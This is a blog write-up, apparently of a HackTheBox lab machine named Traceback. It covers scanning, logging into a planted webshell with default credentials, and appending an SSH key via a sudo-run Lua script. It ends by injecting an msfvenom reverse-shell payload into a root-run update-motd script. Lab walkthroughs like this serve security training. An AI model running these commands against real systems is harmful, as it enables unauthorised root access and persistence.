<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Write-up Traceback Machine | PCW3R</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Write-up Traceback Machine" /><meta name="author" content="ScarNGone & pcw3r" /><meta property="og:locale" content="en_US" /><meta name="description" content="Ref°: HTB-13-Boot2Root" /><meta property="og:description" content="Ref°: HTB-13-Boot2Root" /><link rel="canonical" href="https://pcw3r.github.io/posts/HTB-13-Pentest-Traceback/" /><meta property="og:url" content="https://pcw3r.github.io/posts/HTB-13-Pentest-Traceback/" /><meta property="og:site_name" content="PCW3R" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-08-15T17:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Write-up Traceback Machine" /><meta name="twitter:site" content="@PCW3R" /><meta name="twitter:creator" content="@ScarNGone & pcw3r" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"headline":"Write-up Traceback Machine","description":"Ref°: HTB-13-Boot2Root","datePublished":"2020-08-15T17:00:00+02:00","dateModified":"2020-08-15T17:00:00+02:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://pcw3r.github.io/posts/HTB-13-Pentest-Traceback/"},"url":"https://pcw3r.github.io/posts/HTB-13-Pentest-Traceback/","author":{"@type":"Person","name":"ScarNGone & pcw3r"},"@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div class="profile-text mt-3"><div class="site-title"> <a href="/">PCW3R</a></div><div class="site-subtitle font-italic">Think outside the box.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/PCW3R" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/PCW3R" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['pcw3r','protonmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Write-up Traceback Machine</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Write-up Traceback Machine</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Sat, Aug 15, 2020, 5:00 PM +0200"> {"long"=>"Aug 15, 2020", "short"=>"Aug 15"} <i class="unloaded">2020-08-15T17:00:00+02:00</i> </span> by <span class="author"> ScarNGone & pcw3r </span></div></div><div class="post-tail-wrapper-head"> <i class="fas fa-hourglass-half fa-fw mr-1"></i> <span class="reading-time" title="Estimated read time"> 6 mins read </span></div><div class="post-content"><p><strong><center>Ref°: HTB-13-Boot2Root</center></strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Badge-Traceback.png" alt="Desktop View" /></p><p>— Traceback is a Linux machine that highlights the exploitation of backdoor (from webshell smevk) present behind a website to gained a foothold. This give us a possibility to enum and find a way to execute lateral movement on user sysadmin through lua script and misconfiguration sudo.</p><p>Scripts in /etc/update-motd.d/* running under root privileges can be write-edited by the user “sysadmin”. This gives the possibility to place payload and grab a “reverse shell” with root privileges.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Information-Traceback.png" alt="Desktop View" /></p><h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2><h3 id="network-service-scanning">Network Service Scanning</h3><hr /><p>The nmap scan reveals <code class="language-plaintext highlighter-rouge">SSH</code> and <code class="language-plaintext highlighter-rouge">Apache</code> to be running on their usual ports; 22 and 80.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-A</span> <span class="nt">-T5</span> 10.10.10.181 <span class="nt">-p-</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-nmap.png" alt="Desktop View" /></p><h3 id="website-defaced">Website defaced</h3><hr /><p>We discover deface site on web service. Apparently <code class="language-plaintext highlighter-rouge">Xh4H hacker</code> left a <code class="language-plaintext highlighter-rouge">backdoor</code>, maybe to exploit it later.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-web.png" alt="Desktop View" /></p><p>The hacker left us a hint in the source code by adding as a comment in the html code this : <code class="language-plaintext highlighter-rouge">Some of the best web shells that you might need ;)</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-source.png" alt="Desktop View" /></p><p>This hint is a reference of the following webshells from github repository : <a href="https://github.com/TheBinitGhimire/Web-Shells">https://github.com/TheBinitGhimire/Web-Shells</a></p><p>A <code class="language-plaintext highlighter-rouge">webshell</code> is a web security threat, which is a web-based implementation of the shell concept. A webshell is able to be uploaded to a web server to allow remote access to the web server, such as the web server’s file system. A webshell is unique in that it enables users to access a web server by way of a web browser that acts like a command-line interface.</p><h2 id="2-foothold---get-into-the-target-"><strong><span style="color:#c0392b">[2] Foothold - Get into the target </span></strong></h2><h3 id="finding-smevk-webshell">Finding SmEvK Webshell</h3><hr /><p>After testing them all, we find the webshell concerned : <code class="language-plaintext highlighter-rouge">SmEvK_PaThAn Shell V3</code> on http://10.10.10.181/smevk.php</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-webshell.png" alt="Desktop View" /></p><p>We success to log-in the webshell with credential mentionned in the source code : <code class="language-plaintext highlighter-rouge">admin / admin</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-githubwebshell.png" alt="Desktop View" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-webshell2.png" alt="Desktop View" /></p><p>The exploitation is successful and we have gained a foothold.</p><h2 id="lateral-movement---move-through-environment"><strong><span style="color:#c0392b">Lateral Movement - Move through environment</span></strong></h2><h3 id="sudo-misconfiguration">Sudo Misconfiguration</h3><hr /><p>Enum with webadmin account and check the file /etc/passwd to find an other interesting system user : sysadmin</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-passwd.png" alt="Desktop View" /></p><p>User sysadmin may run the following commands with no password under root privilege <code class="language-plaintext highlighter-rouge">(ALL) NOPASSWD: /home/sysadmin/luvit</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-misconfigurationsudo.png" alt="Desktop View" /></p><p>We find file under <code class="language-plaintext highlighter-rouge">/home/webadmin/note.txt</code> which refers to a tool to practice lua.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-notes.png" alt="Desktop View" /></p><p><code class="language-plaintext highlighter-rouge">Lua</code> is a lightweight, high-level, multi-paradigm programming language designed primarily for embedded use in applications.</p><p>The tool to practice lua script is <code class="language-plaintext highlighter-rouge">Luvit</code>. He is mentionned above on the result of the command sudo -l.</p><h3 id="ssh-authorized-keys">SSH Authorized Keys</h3><hr /><p>With present misconfiguration on sudo command for the sysadmin user, we use personnal lua script to send my public ssh key in her folder <code class="language-plaintext highlighter-rouge">*/.ssh/authorized_keys</code>. Same method in other machine : See Postman Writeup.</p><p>Reference - lua script : <a href="https://www.tutorialspoint.com/lua/lua_file_io.htm">https://www.tutorialspoint.com/lua/lua_file_io.htm</a></p><p>After search in the documentation, we can define the script pattern to be used :</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>CODEfile <span class="o">=</span> io.open <span class="o">(</span>filename <span class="o">[</span>, mode]<span class="o">)</span>
file:write<span class="o">(</span><span class="s2">"--test"</span><span class="o">)</span>
file:close<span class="o">()</span>
.....
filename <span class="o">=</span> <span class="s2">"/home/sysadmin/.ssh/authorized_keys"</span>
mode <span class="o">=</span> <span class="s2">"a"</span> Append mode that opens an existing file or creates a new file <span class="k">for </span>appending.
<span class="nt">--test</span> <span class="o">=</span> <span class="s2">"pub ssh key value"</span>
</pre></table></code></div></div><p>We generate our ssh key pair to put the public key value in our lua script.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 2048
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-scriptlua.png" alt="Desktop View" /></p><p>We upload the script from the webshell and execute this under root privilege.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-upload.png" alt="Desktop View" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-runscript.png" alt="Desktop View" /></p><h3 id="remote-service-ssh-login">Remote Service SSH login</h3><hr /><p>We have now the possibility to connect on sysadmin through ssh :</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>ssh sysadmin@10.10.10.181 <span class="nt">-i</span> traceback
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-sysadminssh.png" alt="Desktop View" /></p><h3 id="flag-user">Flag user</h3><hr /><p>We flag the user to validate the compromission of the system user.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-userflag.png" alt="Desktop View" /></p><h2 id="3-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[3] Privilege Escalation - Gain higher-level permissions</span></strong></h2><h3 id="privilege-misconfiguration">Privilege Misconfiguration</h3><hr /><p>We use linpeas script to check every possible path to increase our privilege.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-sendlinpeas.png" alt="Desktop View" /></p><p>The script reveal interesting group named <code class="language-plaintext highlighter-rouge">/etc/update-motd.d</code> where many files are writables with sysadmin privilege.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-groupwfiles.png" alt="Desktop View" /></p><p>We can confirm that with <code class="language-plaintext highlighter-rouge">ls -la</code> command.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-verifwfile.png" alt="Desktop View" /></p><p>According to linux manual :</p><p>“UNIX/Linux system adminstrators often communicate important information to console and remote users by maintaining text in the file /etc/motd, which is displayed by the pam_motd(8) module on interactive shell logins. Traditionally, this file is static text, typically installed by the distribution and only updated on release upgrades, or overwritten by the local administrator with pertinent information.</p><p>Ubuntu introduced the update-motd framework, by which the motd(5) is dynamically assembled from a collection of scripts at login.</p><p>Executable scripts in /etc/update-motd.d/* are executed by pam_motd(8) as the root user at each login, and this information is concatenated in /var/run/motd. The order of script execution is determined by the run-parts(8) –lsbsysinit option (basically alphabetical order, with a few caveats).”</p><p>Reference - Manual Linux Update-motd.d : <a href="http://manpages.ubuntu.com/manpages/trusty/man5/update-motd.5.html">http://manpages.ubuntu.com/manpages/trusty/man5/update-motd.5.html</a></p><p>Here you can see how this works when you log on to ssh :</p><p>For this example /etc/update-motd.d/<code class="language-plaintext highlighter-rouge">00-header</code> file = <code class="language-plaintext highlighter-rouge">Welcome to Xh4H land</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-headerssh.png" alt="Desktop View" /></p><p>The use of the <code class="language-plaintext highlighter-rouge">pspy tool</code> confirms the execution of these scripts under root privilege <code class="language-plaintext highlighter-rouge">(UID 0)</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-checkprocess.png" alt="Desktop View" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-sshview.png" alt="Desktop View" /></p><h3 id="obtaining-reverse-shell-with-payload-injection">Obtaining Reverse Shell with Payload Injection</h3><hr /><p>We can push custom payload into one of theses script to get reverse shell under root privilege when they are executed.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nt">-f</span> elf <span class="nt">-o</span> shell <span class="nv">LHOST</span><span class="o">=</span>10.10.14.54 <span class="nv">LPORT</span><span class="o">=</span>4444
</pre></table></code></div></div><p>After creating our payload, we send it to our target machine and place it in the /tmp/ folder.</p><p>Now we can call our payload to be executed in one of the scripts in the update-motd.d folder. I choose 00-header.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-insertpayload.png" alt="Desktop View" /></p><p>We prepare our attacking machine to receive the shell with nc command and we launch new ssh connexion.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-viewexploit.png" alt="Desktop View" /></p><h3 id="flag-root">Flag root</h3><hr /><p>We obtained the shell under root privilege. We have compromise Traceback machine.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/traceback/HTB-Images-Traceback-rootflag.png" alt="Desktop View" /></p><hr /><h2 id="trophy"><strong><center>Trophy</center></strong></h2><blockquote><p><strong>Aim for the sky, but move slowly, enjoying every step along the way. It is all those little steps that make the journey complete.</strong></p><p>Chanda Kochhar</p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/boot2root/'>Boot2Root</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >WINDOWS</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >EASY</a> <a href="/tags/enumeration/" class="post-tag no-text-decoration" >ENUMERATION</a> <a href="/tags/scripting/" class="post-tag no-text-decoration" >SCRIPTING</a> <a href="/tags/sudo-exploitation/" class="post-tag no-text-decoration" >SUDO EXPLOITATION</a> <a href="/tags/permission-exploitation/" class="post-tag no-text-decoration" >PERMISSION EXPLOITATION</a> <a href="/tags/payload/" class="post-tag no-text-decoration" >PAYLOAD</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Write-up Traceback Machine - PCW3R&url=https://pcw3r.github.io/posts/HTB-13-Pentest-Traceback/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Write-up Traceback Machine - PCW3R&u=https://pcw3r.github.io/posts/HTB-13-Pentest-Traceback/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Write-up Traceback Machine - PCW3R&url=https://pcw3r.github.io/posts/HTB-13-Pentest-Traceback/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">LINUX</a> <a class="post-tag" href="/tags/web-exploitation/">WEB EXPLOITATION</a> <a class="post-tag" href="/tags/payload/">PAYLOAD</a> <a class="post-tag" href="/tags/password-cracking/">PASSWORD CRACKING</a> <a class="post-tag" href="/tags/medium/">MEDIUM</a> <a class="post-tag" href="/tags/database-exploitation/">DATABASE EXPLOITATION</a> <a class="post-tag" href="/tags/active-directory-exploitation/">ACTIVE DIRECTORY EXPLOITATION</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/sudo-exploitation/">SUDO EXPLOITATION</a> <a class="post-tag" href="/tags/password-decrypt/">PASSWORD DECRYPT</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-12-Pentest-Cascade/" class="btn btn-outline-primary"><p>Write-up Cascade Machine</p></a> <a href="/posts/HTB-14-Pentest-Magic/" class="btn btn-outline-primary"><p>Write-up Magic Machine</p></a></div><!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-15-Pentest-Remote/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Sep 25, 2020 <i class="unloaded">2020-09-25T11:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Write-up Remote Machine</h3><div class="text-muted small"><p> Ref°: HTB-15-Boot2Root ![Desktop View]({{ “/assets/img/remote/HTB-Badge-Remote.png” relative_url }}) — Remote is a vulnerable machine through a misconfigured NFS sha...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-11-Pentest-Sauna/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Jul 18, 2020 <i class="unloaded">2020-07-18T11:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Write-up Sauna Machine</h3><div class="text-muted small"><p> Ref°: HTB-11-Boot2Root — Sauna is a Windows machine that highlights the enumeration of users through the web and ldap service and the practice of the AS-REP Roasting attack (Kerberos service) wi...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-16-Pentest-Admirer/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Sep 26, 2020 <i class="unloaded">2020-09-26T11:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Write-up Admirer Machine</h3><div class="text-muted small"><p> Ref°: HTB-16-Boot2Root ![Desktop View]({{ “/assets/img/admirer/HTB-Badge-Admirer.png” relative_url }}) — Admirer is a vulnerable machine through web and database exp...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 